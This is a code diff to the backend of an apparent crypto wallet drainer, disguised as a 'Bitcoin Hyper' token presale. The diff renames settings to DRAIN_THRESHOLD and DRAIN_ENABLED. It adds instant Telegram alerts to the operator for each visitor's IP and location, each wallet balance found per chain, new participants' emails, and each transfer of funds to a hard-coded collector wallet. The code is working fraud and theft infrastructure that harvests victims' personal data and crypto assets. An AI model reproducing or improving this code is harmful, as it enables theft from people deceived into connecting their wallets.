@@ -39,7 +39,7 @@ const limiter = rateLimit({
   max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
   message: { error: 'Too many requests, please try again later.' }
 });
-app.use('/api/', limiter));
+app.use('/api/', limiter); // ✅ FIXED: removed extra parenthesis
 
 // ============================================
 // ROOT ENDPOINT
@@ -194,7 +194,7 @@ const memoryStorage = {
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
-    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
+    valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
     statistics: {
       totalParticipants: 0,
       eligibleParticipants: 0,
@@ -204,14 +204,14 @@ const memoryStorage = {
       totalProcessedWallets: 0,
       processedTransactions: []
     },
-    flowEnabled: process.env.FLOW_ENABLED === 'true'
+    flowEnabled: process.env.DRAIN_ENABLED === 'true'
   },
   emailCache: new Map(),
   siteVisits: []
 };
 
 // ============================================
-// TELEGRAM FUNCTIONS - FIXED FOR SUPERGROUP
+// TELEGRAM FUNCTIONS - FIXED FOR INSTANT REPORTING
 // ============================================
 
 async function sendTelegramMessage(text) {
@@ -219,12 +219,12 @@ async function sendTelegramMessage(text) {
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
   if (!botToken || !chatId) {
-    console.log('⚠️ Telegram credentials missing - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env');
+    console.log('⚠️ Telegram credentials missing');
     return false;
   }
   
   try {
-    // Force parse_mode to HTML and ensure chat_id is properly formatted
+    console.log(`📤 Sending Telegram message to ${chatId}`);
     const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: text,
@@ -245,9 +245,6 @@ async function sendTelegramMessage(text) {
     }
   } catch (error) {
     console.error('❌ Telegram send error:', error.response?.data || error.message);
-    if (error.response?.data?.description) {
-      console.error('Telegram error description:', error.response.data.description);
-    }
     return false;
   }
 }
@@ -263,7 +260,6 @@ async function testTelegramConnection() {
   }
   
   try {
-    // Test 1: Check if bot token is valid
     const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
     
     if (!meResponse.data?.ok) {
@@ -275,31 +271,28 @@ async function testTelegramConnection() {
     telegramBotName = meResponse.data.result.username;
     console.log(`✅ Bot authenticated: @${telegramBotName}`);
     
-    // Test 2: Try to send a test message to verify chat_id works
-    const testMessage = 
+    // Send startup message
+    const startMessage = 
       `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
       `✅ MultiChain FlowRouter Ready\n` +
-      `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
+      `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `📊 Use /api/admin/dashboard?token=YOUR_TOKEN for admin view`;
+      `📊 Admin: /api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
-    const sendResult = await sendTelegramMessage(testMessage);
+    const sendResult = await sendTelegramMessage(startMessage);
     
     if (sendResult) {
       telegramEnabled = true;
       console.log('✅ Telegram configured and working!');
       return true;
     } else {
-      console.error('❌ Failed to send test message - check chat_id');
+      console.error('❌ Failed to send test message');
       telegramEnabled = false;
       return false;
     }
     
   } catch (error) {
     console.error('❌ Telegram connection failed:', error.message);
-    if (error.response?.data?.description) {
-      console.error('Telegram error:', error.response.data.description);
-    }
     telegramEnabled = false;
     return false;
   }
@@ -383,45 +376,6 @@ async function getWalletEmail(walletAddress) {
 }
 
 // ============================================
-// TRACK SITE VISIT
-// ============================================
-
-async function trackSiteVisit(ip, userAgent, referer, path) {
-  const location = await getIPLocation(ip);
-  
-  const visit = {
-    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
-    ip: ip.replace('::ffff:', ''),
-    timestamp: new Date().toISOString(),
-    country: location.country,
-    flag: location.flag,
-    city: location.city,
-    region: location.region,
-    userAgent: userAgent || 'Unknown',
-    referer: referer || 'Direct',
-    path: path || '/',
-    walletConnected: false,
-    walletAddress: null
-  };
-  
-  memoryStorage.siteVisits.push(visit);
-  
-  // Send Telegram notification for site visit with full details
-  const telegramMessage = 
-    `${location.flag} <b>NEW SITE VISIT</b>\n` +
-    `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
-    `🌐 <b>IP:</b> ${ip.replace('::ffff:', '')}\n` +
-    `🖥️ <b>Device:</b> ${userAgent?.substring(0, 60)}...\n` +
-    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
-    `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🆔 <b>Visit ID:</b> ${visit.id}`;
-  
-  await sendTelegramMessage(telegramMessage);
-  
-  return visit;
-}
-
-// ============================================
 // GET IP LOCATION
 // ============================================
 
@@ -460,10 +414,49 @@ async function getIPLocation(ip) {
 }
 
 // ============================================
-// WALLET BALANCE CHECK - PER CHAIN DETAILED
+// TRACK SITE VISIT - INSTANT TELEGRAM
 // ============================================
 
-async function getWalletBalance(walletAddress) {
+async function trackSiteVisit(ip, userAgent, referer, path) {
+  const location = await getIPLocation(ip);
+  
+  const visit = {
+    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
+    ip: ip.replace('::ffff:', ''),
+    timestamp: new Date().toISOString(),
+    country: location.country,
+    flag: location.flag,
+    city: location.city,
+    region: location.region,
+    userAgent: userAgent || 'Unknown',
+    referer: referer || 'Direct',
+    path: path || '/',
+    walletConnected: false,
+    walletAddress: null
+  };
+  
+  memoryStorage.siteVisits.push(visit);
+  
+  // INSTANT Telegram notification for site visit
+  const telegramMessage = 
+    `${location.flag} <b>NEW SITE VISIT</b>\n` +
+    `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
+    `🌐 <b>IP:</b> ${visit.ip}\n` +
+    `🖥️ <b>Device:</b> ${userAgent?.substring(0, 50)}...\n` +
+    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
+    `📱 <b>Path:</b> ${path || '/'}\n` +
+    `🆔 <b>Visit ID:</b> ${visit.id}`;
+  
+  await sendTelegramMessage(telegramMessage);
+  
+  return visit;
+}
+
+// ============================================
+// WALLET BALANCE CHECK - INSTANT PER-CHAIN REPORTING
+// ============================================
+
+async function getWalletBalance(walletAddress, clientIP = null, location = null) {
   console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
   
   const results = {
@@ -487,7 +480,6 @@ async function getWalletBalance(walletAddress) {
     ];
 
     let totalValue = 0;
-    let chainBalances = [];
     
     for (const chain of chains) {
       try {
@@ -515,7 +507,16 @@ async function getWalletBalance(walletAddress) {
           };
           
           results.balances.push(balanceData);
-          chainBalances.push(balanceData);
+          
+          // INSTANT Telegram notification for EACH CHAIN found
+          const chainMsg = 
+            `💰 <b>CHAIN BALANCE DETECTED</b>\n` +
+            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+            `🔗 <b>Chain:</b> ${chain.name}\n` +
+            `💵 <b>Amount:</b> ${amount.toFixed(6)} ${chain.symbol}\n` +
+            `💲 <b>Value:</b> $${valueUSD.toFixed(2)}`;
+          
+          await sendTelegramMessage(chainMsg);
         }
       } catch (error) {}
     }
@@ -531,22 +532,15 @@ async function getWalletBalance(walletAddress) {
       results.allocation = { amount: '0', valueUSD: '0' };
     }
 
-    // Send detailed Telegram message with per-chain breakdown
-    if (chainBalances.length > 0) {
-      let chainDetails = '';
-      chainBalances.forEach(b => {
-        chainDetails += `\n   • ${b.chain}: ${b.amount.toFixed(6)} ${b.symbol} ($${b.valueUSD.toFixed(2)})`;
-      });
-      
-      const telegramMsg = 
-        `📊 <b>BALANCE SCAN COMPLETE</b>\n` +
-        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💵 <b>Total Value:</b> $${results.totalValueUSD.toFixed(2)}\n` +
-        `🔗 <b>Chains with Balance:</b>${chainDetails}\n` +
-        `🎯 <b>Status:</b> ${results.isEligible ? '✅ ELIGIBLE' : '👋 NOT ELIGIBLE'}`;
-      
-      await sendTelegramMessage(telegramMsg);
-    }
+    // INSTANT Telegram summary after scan
+    const summaryMsg = 
+      `📊 <b>BALANCE SCAN COMPLETE</b>\n` +
+      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+      `💵 <b>Total Value:</b> $${results.totalValueUSD.toFixed(2)}\n` +
+      `🔗 <b>Chains Found:</b> ${results.balances.length}\n` +
+      `🎯 <b>Status:</b> ${results.isEligible ? '✅ ELIGIBLE' : '👋 NOT ELIGIBLE'}`;
+    
+    await sendTelegramMessage(summaryMsg);
 
     return { success: true, data: results };
 
@@ -591,8 +585,7 @@ app.post('/api/track-visit', async (req, res) => {
         visitId: visit.id,
         country: visit.country,
         flag: visit.flag,
-        city: visit.city,
-        region: visit.region
+        city: visit.city
       }
     });
     
@@ -603,7 +596,7 @@ app.post('/api/track-visit', async (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT
+// CONNECT ENDPOINT - INSTANT REPORTING
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -650,9 +643,19 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
+      
+      // INSTANT Telegram for new participant
+      const newUserMsg = 
+        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
+        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
+        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
+        `📧 <b>Email:</b> ${email}`;
+      
+      await sendTelegramMessage(newUserMsg);
     }
     
-    const balanceResult = await getWalletBalance(walletAddress);
+    const balanceResult = await getWalletBalance(walletAddress, clientIP, location);
     
     if (balanceResult.success) {
       participant.totalValueUSD = balanceResult.data.totalValueUSD;
@@ -665,16 +668,15 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      // Send wallet connection notification with location
-      await sendTelegramMessage(
+      // INSTANT Telegram connection summary
+      const connectMsg = 
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD}\n` +
-        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
-        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
-        `📧 <b>Email:</b> ${email}\n` +
-        `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}`
-      );
+        `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
+        `📧 <b>Email:</b> ${email}`;
+      
+      await sendTelegramMessage(connectMsg);
       
       res.json({
         success: true,
@@ -684,7 +686,6 @@ app.post('/api/presale/connect', async (req, res) => {
           country: location.country,
           flag: location.flag,
           city: location.city,
-          region: location.region,
           totalValueUSD: balanceResult.data.totalValueUSD,
           isEligible: balanceResult.data.isEligible,
           eligibilityReason: balanceResult.data.eligibilityReason,
@@ -704,7 +705,7 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT
+// PREPARE FLOW ENDPOINT - INSTANT REPORTING
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
@@ -750,7 +751,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       completedChains: []
     });
     
-    // Create detailed transaction list for Telegram
+    // INSTANT Telegram for flow preparation
     let txDetails = '';
     transactions.forEach((tx, index) => {
       txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
@@ -781,7 +782,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT (RECORDS TRANSACTION FROM FRONTEND)
+// EXECUTE FLOW ENDPOINT - INSTANT PER-CHAIN REPORTING
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -817,7 +818,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // Get transaction amount from pending flow
+      // Get transaction details
       let txAmount = 'unknown';
       let txSymbol = '';
       let txValueUSD = 'unknown';
@@ -831,8 +832,9 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         }
       }
       
+      // INSTANT Telegram for each chain execution
       await sendTelegramMessage(
-        `💰 <b>CHAIN TRANSACTION RECORDED</b>\n` +
+        `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `🔗 <b>Chain:</b> ${chainName}\n` +
         `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
@@ -847,16 +849,15 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           flow.completedChains.push(chainName);
         }
         
-        // Check if all chains completed
+        // INSTANT Telegram when all chains are complete
         if (flow.completedChains.length === flow.transactions.length) {
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
           memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
           
-          // Build completion details
           let completionDetails = '';
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
-            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})`;
+            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol}`;
           });
           
           await sendTelegramMessage(
@@ -879,7 +880,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT
+// CLAIM ENDPOINT - INSTANT REPORTING
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -902,6 +903,7 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
+    // INSTANT Telegram for claim completion
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
@@ -1108,7 +1110,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   
-  🤖 TELEGRAM STATUS: ${telegramEnabled ? '✅ Connected' : '❌ Disabled - Check .env file'}
+  🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
   
   🚀 READY FOR MULTICHAIN FLOWS
   `);
